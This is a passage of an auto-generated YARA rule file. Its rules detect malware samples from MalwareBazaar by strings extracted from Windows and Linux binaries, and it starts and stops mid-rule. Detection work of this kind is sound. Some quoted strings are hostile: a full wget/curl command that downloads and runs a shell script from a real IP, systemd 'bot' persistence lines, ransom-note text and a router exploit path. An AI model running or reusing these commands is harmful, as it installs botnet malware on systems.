        $s12 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
        $s13 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
        $s15 = "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
        $s16 = "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)"
        $s17 = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
        $s18 = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5"
        $s19 = "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60"
        $s20 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 101KB and
        all of them
}

rule Windows_912219efa4940fedba91e95f161b179e83191ef6c4eb15be2a8bee66cb988f6f
{
    meta:
        description = "Auto ML: 912219efa4940fedba91e95f161b179e83191ef6c4eb15be2a8bee66cb988f6f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 312KB and
        all of them
}

rule Windows_913377afa6c3d7afb49a491f830d52a33353349819f0e91157a01dc8336ac5b3
{
    meta:
        description = "Auto ML: 913377afa6c3d7afb49a491f830d52a33353349819f0e91157a01dc8336ac5b3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "`.reloc"
        $s4 = "^cMdMX"
        $s5 = "mscoree.dll"
        $s6 = "<Module>"
        $s7 = "GetHINSTANCE"
        $s8 = "System.IO"
        $s9 = "Read"
        $s10 = "get_CurrentThread"
        $s11 = "thread"
        $s12 = "Load"
        $s13 = "get_IsAttached"
        $s14 = "set_IsBackground"
        $s15 = "GetMethod"
        $s16 = "CreateInstance"
        $s17 = "GetTypeFromHandle"
        $s18 = "get_Module"
        $s19 = "LoadModule"
        $s20 = "get_ManifestModule"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 583KB and
        all of them
}

rule Windows_9133b62cf224ab836d86d3aff622629e91730a557ade8fc281261a9f49e7b319
{
    meta:
        description = "Auto ML: 9133b62cf224ab836d86d3aff622629e91730a557ade8fc281261a9f49e7b319"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "|gOOGLE|cHROME|uSER"
        $s5 = "sETTINGS|IBNEJDFJMMKPCNLPEBKLMNKOEOIHOFEC"
        $s6 = "RECONNECTyQ"
        $s7 = "skdc25wi352.exe"
        $s8 = "System.Web.Extensions"
        $s9 = "System.Windows.Forms"
        $s10 = "System"
        $s11 = "System.Drawing"
        $s12 = "System.Core"
        $s13 = "System.Runtime.Serialization"
        $s14 = "System.Security"
        $s15 = "System.Xml"
        $s16 = "System.Management"
        $s17 = "kernel32.dll"
        $s18 = "user32.dll"
        $s19 = "advapi32.dll"
        $s20 = "Kernel32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 820KB and
        all of them
}

rule Linux_91546d003ebb7245338193b6593470b3d0b4a8a249b9fc863afe35f42d2609e8
{
    meta:
        description = "Auto ML: 91546d003ebb7245338193b6593470b3d0b4a8a249b9fc863afe35f42d2609e8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/system"
        $s2 = "/ (deleted)"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s5 = "Windows XP"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 70KB and
        all of them
}

rule Linux_917053f9fda8808ce0ae455c527011de8444e0f86e87de0f20c38b05153324d5
{
    meta:
        description = "Auto ML: 917053f9fda8808ce0ae455c527011de8444e0f86e87de0f20c38b05153324d5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 18KB and
        all of them
}

rule Windows_91a358840c88bc0b3152b2724d5d23c333d1cb78ec042fb99b11842d1b63a2fd
{
    meta:
        description = "Auto ML: 91a358840c88bc0b3152b2724d5d23c333d1cb78ec042fb99b11842d1b63a2fd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6255KB and
        all of them
}

rule Windows_9219d0d478084b4376d2d8bddd299578e641adcc84d55623d630a9a46044ef19
{
    meta:
        description = "Auto ML: 9219d0d478084b4376d2d8bddd299578e641adcc84d55623d630a9a46044ef19"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ReadInt32"
        $s5 = "ReadUInt16"
        $s6 = "<Module>"
        $s7 = "get_ASCII"
        $s8 = "System.IO"
        $s9 = "GetData"
        $s10 = "System.Collections.Generic"
        $s11 = "GetResponseAsync"
        $s12 = "WriteAsync"
        $s13 = "ReadAsByteArrayAsync"
        $s14 = "get_CurrentManagedThreadId"
        $s15 = "get_CanRead"
        $s16 = "Thread"
        $s17 = "Load"
        $s18 = "get_Connected"
        $s19 = "get_IsCompleted"
        $s20 = "get_Millisecond"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 781KB and
        all of them
}

rule Windows_9243bdcbe30fbd430a841a623e9e1bcc894e4fdc136d46e702a94dad4b10dfdc
{
    meta:
        description = "Auto ML: 9243bdcbe30fbd430a841a623e9e1bcc894e4fdc136d46e702a94dad4b10dfdc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "delete"
        $s6 = "delete[]"
        $s7 = "`placement delete closure'"
        $s8 = "`placement delete[] closure'"
        $s9 = "`local static thread guard'"
        $s10 = "FlsGetValue"
        $s11 = "FlsSetValue"
        $s12 = "CorExitProcess"
        $s13 = "AreFileApisANSI"
        $s14 = "AppPolicyGetProcessTerminationMethod"
        $s15 = "1) We can restore your entire system."
        $s16 = "4) We are open to negotiations."
        $s17 = "5) We are ready to maintain complete confidentiality of this incident."
        $s18 = "Subsequently, the date will be disclosed, leading to fines, legal actions, and reputational damage."
        $s19 = "You pay a specified amount and receive the full decryption, support throughout the decryption process,"
        $s20 = "proofs that all information on our servers has been deleted, and a guarantee that it will never resurface,"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 217KB and
        all of them
}

rule Windows_924c4262387d3016bbd79022ee36bb595a046744759a307bc9ba7f9374da888c
{
    meta:
        description = "Auto ML: 924c4262387d3016bbd79022ee36bb595a046744759a307bc9ba7f9374da888c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = "OPenGL"
        $s4 = "window"
        $s5 = "http://www.zerowork.cn"
        $s6 = "CFile"
        $s7 = "CMemFile"
        $s8 = "CTempGdiObject"
        $s9 = "CTempDC"
        $s10 = "CWindowDC"
        $s11 = "CUserException"
        $s12 = "MS Shell Dlg"
        $s13 = "CTempWnd"
        $s14 = "GetMonitorInfoA"
        $s15 = "MonitorFromWindow"
        $s16 = "GetSystemMetrics"
        $s17 = "USER32"
        $s18 = "COMCTL32.DLL"
        $s19 = "CFileDialog"
        $s20 = "CWinApp"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1465KB and
        all of them
}

rule Linux_928d37db91b67a90a3fd7f9bd599c2639ba2bd754aa8c8b19499e3611eec5a5a
{
    meta:
        description = "Auto ML: 928d37db91b67a90a3fd7f9bd599c2639ba2bd754aa8c8b19499e3611eec5a5a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "/proc/self/cmdline"
        $s4 = "No such file or directory"
        $s5 = "No such process"
        $s6 = "Interrupted system call"
        $s7 = "Bad file descriptor"
        $s8 = "No child processes"
        $s9 = "Resource temporarily unavailable"
        $s10 = "File exists"
        $s11 = "Too many open files in system"
        $s12 = "Too many open files"
        $s13 = "Text file busy"
        $s14 = "File too large"
        $s15 = "Read-only file system"
        $s16 = "File name too long"
        $s17 = "Level 3 reset"
        $s18 = "Bad font file format"
        $s19 = "Multihop attempted"
        $s20 = "File descriptor in bad state"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 58KB and
        all of them
}

rule Windows_0eba2b6e7c10156a15d9c09d2cb7c20c34e1f024c4627159d7afb9b3be7d39af
{
    meta:
        description = "Auto ML: 0eba2b6e7c10156a15d9c09d2cb7c20c34e1f024c4627159d7afb9b3be7d39af"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<FrmMain_Load>b__2_0"
        $s5 = "<FrmMain_Load>b__2_1"
        $s6 = "<FrmMain_Load>b__2_2"
        $s7 = "<Module>"
        $s8 = "get_kAlR"
        $s9 = "set_SpeedX"
        $s10 = "System.Collections.Generic"
        $s11 = "Read"
        $s12 = "Thread"
        $s13 = "add_Load"
        $s14 = "FrmMain_Load"
        $s15 = "get_OrangeRed"
        $s16 = "get_Speed"
        $s17 = "set_Speed"
        $s18 = "get_Enabled"
        $s19 = "set_Enabled"
        $s20 = "set_DoubleBuffered"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 634KB and
        all of them
}

rule Windows_92ae585601392f31c4d97172681645d0353c8cdf425e40a5f89581b40643c3f8
{
    meta:
        description = "Auto ML: 92ae585601392f31c4d97172681645d0353c8cdf425e40a5f89581b40643c3f8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "2DSFVCXVCX.exe"
        $s6 = "System"
        $s7 = "System.Runtime.CompilerServices"
        $s8 = "System.Diagnostics"
        $s9 = "ProcessStartInfo"
        $s10 = "set_FileName"
        $s11 = "set_Arguments"
        $s12 = "ProcessWindowStyle"
        $s13 = "set_WindowStyle"
        $s14 = "set_CreateNoWindow"
        $s15 = "Process"
        $s16 = "mscoree.dll"
        $s17 = "powershell"
        $s18 = "VarFileInfo"
        $s19 = "StringFileInfo"
        $s20 = "FileDescription"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6KB and
        all of them
}

rule Windows_92d28b540d63ccc0f54b297859ab68896fa9f650e7db459e27a4c7af271257f9
{
    meta:
        description = "Auto ML: 92d28b540d63ccc0f54b297859ab68896fa9f650e7db459e27a4c7af271257f9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2993KB and
        all of them
}

rule Linux_92f16c6b9168dd2bf302f99ee0981885327c91f0ef028749d5242e4ad67598f0
{
    meta:
        description = "Auto ML: 92f16c6b9168dd2bf302f99ee0981885327c91f0ef028749d5242e4ad67598f0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "[http flood] headers: \"%s\""
        $s4 = "http"
        $s5 = "socket:"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 78KB and
        all of them
}

rule Linux_9315c9e9c5a4c97d451a7abe9c874d1f10e8a5128f9832ed95096e8690cd8a3c
{
    meta:
        description = "Auto ML: 9315c9e9c5a4c97d451a7abe9c874d1f10e8a5128f9832ed95096e8690cd8a3c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "socket:["
        $s5 = ".text"
        $s6 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 63KB and
        all of them
}

rule Windows_9397e1a3bd7e94ae5213d8dc4edef5e73fe8c6f0306196a1ffae832a3976e9ac
{
    meta:
        description = "Auto ML: 9397e1a3bd7e94ae5213d8dc4edef5e73fe8c6f0306196a1ffae832a3976e9ac"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4589KB and
        all of them
}

rule Windows_93a039cd592c64a14e6e688f805b8f069cc2ec03a1d07ce6bb8db3b4fefe9745
{
    meta:
        description = "Auto ML: 93a039cd592c64a14e6e688f805b8f069cc2ec03a1d07ce6bb8db3b4fefe9745"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" language=\"*\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\"></assemblyIdentity>"
        $s3 = "KERNEL32.DLL"
        $s4 = "ADVAPI32.dll"
        $s5 = "COMCTL32.dll"
        $s6 = "COMDLG32.dll"
        $s7 = "OLEAUT32.dll"
        $s8 = "PSAPI.DLL"
        $s9 = "SHELL32.dll"
        $s10 = "USER32.dll"
        $s11 = "USERENV.dll"
        $s12 = "VERSION.dll"
        $s13 = "WININET.dll"
        $s14 = "WINMM.dll"
        $s15 = "WSOCK32.dll"
        $s16 = "LoadLibraryA"
        $s17 = "GetProcAddress"
        $s18 = "ExitProcess"
        $s19 = "GetAce"
        $s20 = "GetSaveFileNameW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1758KB and
        all of them
}

rule Windows_93a2c3a7562db6cc54e76e271e95717d18ab7016631719206700464aa452e913
{
    meta:
        description = "Auto ML: 93a2c3a7562db6cc54e76e271e95717d18ab7016631719206700464aa452e913"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "@.reloc"
        $s5 = "MODULE^&p"
        $s6 = "KERNEL32.dll"
        $s7 = "USER32.dll"
        $s8 = "ResetEvent"
        $s9 = "CreateThread"
        $s10 = "LoadLibraryA"
        $s11 = "GetModuleHandleA"
        $s12 = "GetCommandLineW"
        $s13 = "SetEvent"
        $s14 = "CreateProcessA"
        $s15 = "ExitProcess"
        $s16 = "GetTickCount"
        $s17 = "GetClientRect"
        $s18 = "GetWindowRect"
        $s19 = "BeginDeferWindowPos"
        $s20 = "DeferWindowPos"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 585KB and
        all of them
}

rule Linux_93bee6e417bff657b4aee266e11a1c220a86989b8aeb8f9b279f8fcd37c64921
{
    meta:
        description = "Auto ML: 93bee6e417bff657b4aee266e11a1c220a86989b8aeb8f9b279f8fcd37c64921"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "/proc/self/cmdline"
        $s4 = "No such file or directory"
        $s5 = "No such process"
        $s6 = "Interrupted system call"
        $s7 = "Bad file descriptor"
        $s8 = "No child processes"
        $s9 = "Resource temporarily unavailable"
        $s10 = "File exists"
        $s11 = "Too many open files in system"
        $s12 = "Too many open files"
        $s13 = "Text file busy"
        $s14 = "File too large"
        $s15 = "Read-only file system"
        $s16 = "File name too long"
        $s17 = "Level 3 reset"
        $s18 = "Bad font file format"
        $s19 = "Multihop attempted"
        $s20 = "File descriptor in bad state"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 62KB and
        all of them
}

rule Windows_940fb14d8859c02f6df35e6345ac7f3b5c39df3e59a59b02575a8dbb879eb523
{
    meta:
        description = "Auto ML: 940fb14d8859c02f6df35e6345ac7f3b5c39df3e59a59b02575a8dbb879eb523"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "rotaretI.setatS.ptlsygJ"
        $s6 = "ofnI.setatS.ptlsygJ"
        $s7 = "metsySetaitnatsnI"
        $s8 = "metsySetirW"
        $s9 = "metsySeteleD"
        $s10 = "metsyStseT"
        $s11 = "metsySetaerC"
        $s12 = "metsySetupmoC"
        $s13 = "metsySetadpU"
        $s14 = "metsySetaR"
        $s15 = "metItseT"
        $s16 = "oglAtseT"
        $s17 = "dohteMtseT"
        $s18 = "edoCtseT"
        $s19 = "tcurtSetadilaV"
        $s20 = "tcurtSetaluclaC"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 717KB and
        all of them
}

rule Linux_944035b2dc54907819cf64c2b8c2acc0771485ebe1ac229f47fd8fdcaff5cbb1
{
    meta:
        description = "Auto ML: 944035b2dc54907819cf64c2b8c2acc0771485ebe1ac229f47fd8fdcaff5cbb1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 43KB and
        all of them
}

rule Windows_0f11aeecbde1f355d26c9d406dad80cb0ae8536aea31fdddaf915d4afd434f3f
{
    meta:
        description = "Auto ML: 0f11aeecbde1f355d26c9d406dad80cb0ae8536aea31fdddaf915d4afd434f3f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "FT5sety"
        $s6 = "read"
        $s7 = "Filef"
        $s8 = "/rustc/897e37553bba8b42751c67658967889d11ecd120\\library\\std\\src\\io\\readbuf.rs"
        $s9 = "invalid seek to a negative or overflowing position"
        $s10 = "failed to write whole bufferL"
        $s11 = "failed to write the buffered data"
        $s12 = "uespemosarenegylmodnarodsetybdet"
        $s13 = "C:\\Program Files\\C:\\Program Files (x86)\\"
        $s14 = "\\Microsoft\\Windows\\Start Menu\\Programs\\"
        $s15 = "\\User Pinned\\TaskBar\\"
        $s16 = "Google\\Chrome\\Application\\chrome.exeBraveSoftware\\Brave-Browser\\Application\\brave.exe\\Microsoft\\Edge\\Application\\msedge.exe"
        $s17 = "--load-extension=\"\""
        $s18 = "failed to get current exe path:"
        $s19 = "rerunInvalid local file header"
        $s20 = "mslnkC:\\Users\\ilide\\.cargo\\registry\\src\\github.com-1285ae84e5963aae\\mslnk-0.1.8\\src\\lib.rs"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3072KB and
        all of them
}

rule Windows_94587b41a0eb5e2c592976fa283b0bfc0ef2e2c5cec24bba298cda0eb67270de
{
    meta:
        description = "Auto ML: 94587b41a0eb5e2c592976fa283b0bfc0ef2e2c5cec24bba298cda0eb67270de"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "gdiplus.dll"
        $s7 = "Cabinet.dll"
        $s8 = "USER32.dll"
        $s9 = "ADVAPI32.dll"
        $s10 = "SHELL32.dll"
        $s11 = "OLEAUT32.dll"
        $s12 = "regex_error(error_complexity): The complexity of an attempted match against a regular expression exceeded a pre-set level."
        $s13 = "no such process"
        $s14 = "already connected"
        $s15 = "bad file descriptor"
        $s16 = "connection aborted"
        $s17 = "connection already in progress"
        $s18 = "connection refused"
        $s19 = "connection reset"
        $s20 = "file exists"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7092KB and
        all of them
}

rule Windows_94627d8117da7cccd8c34a1d8ad88d988a26ec6337d0d66559ee6943f2c2a233
{
    meta:
        description = "Auto ML: 94627d8117da7cccd8c34a1d8ad88d988a26ec6337d0d66559ee6943f2c2a233"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2419KB and
        all of them
}

rule Linux_9478bb8fa96a4b9baa199be60285800027abb1fd296ca8e0a0fd26ee647c49ff
{
    meta:
        description = "Auto ML: 9478bb8fa96a4b9baa199be60285800027abb1fd296ca8e0a0fd26ee647c49ff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "/cmdline"
        $s3 = "/wget"
        $s4 = "/bin/bash -c \"/bin/wget http://82.165.215.205/bins/bins.sh; chmod +x bins.sh; sh bins.sh; /bin/curl -k -L --output bins.sh http://82.165.215.205/bins/bins.sh; chmod +x bins.sh; sh bins.sh\""
        $s5 = "After=network.target"
        $s6 = "User=root"
        $s7 = "WantedBy=multi-user.target"
        $s8 = "/lib/systemd/system/bot.service"
        $s9 = "/bin/systemctl enable bot"
        $s10 = "No such file or directory"
        $s11 = "No such process"
        $s12 = "Interrupted system call"
        $s13 = "Bad file descriptor"
        $s14 = "No child processes"
        $s15 = "Resource temporarily unavailable"
        $s16 = "File exists"
        $s17 = "Too many open files in system"
        $s18 = "Too many open files"
        $s19 = "Text file busy"
        $s20 = "File too large"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 65KB and
        all of them
}

rule Windows_94a65cca7423e32a923dcc0aad65712c9048d5c79d51162237ebd24a8d99f961
{
    meta:
        description = "Auto ML: 94a65cca7423e32a923dcc0aad65712c9048d5c79d51162237ebd24a8d99f961"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_ImagenURL"
        $s6 = "set_ImagenURL"
        $s7 = "get_Marca"
        $s8 = "set_Marca"
        $s9 = "get_Categoria"
        $s10 = "set_Categoria"
        $s11 = "System.Data"
        $s12 = "setearConsulta"
        $s13 = "System.Collections.Generic"
        $s14 = "Read"
        $s15 = "add_Load"
        $s16 = "frmConSettings_Load"
        $s17 = "set_AutoScaleMode"
        $s18 = "set_SizeMode"
        $s19 = "set_Image"
        $s20 = "GetTypeFromHandle"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 625KB and
        all of them
}

rule Windows_94b238a6c0c1757059b32035d7f7908b93a03c95cbcfb5c410380093a4ae3e00
{
    meta:
        description = "Auto ML: 94b238a6c0c1757059b32035d7f7908b93a03c95cbcfb5c410380093a4ae3e00"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Core"
        $s10 = "System.Diagnostics"
        $s11 = "<Module>"
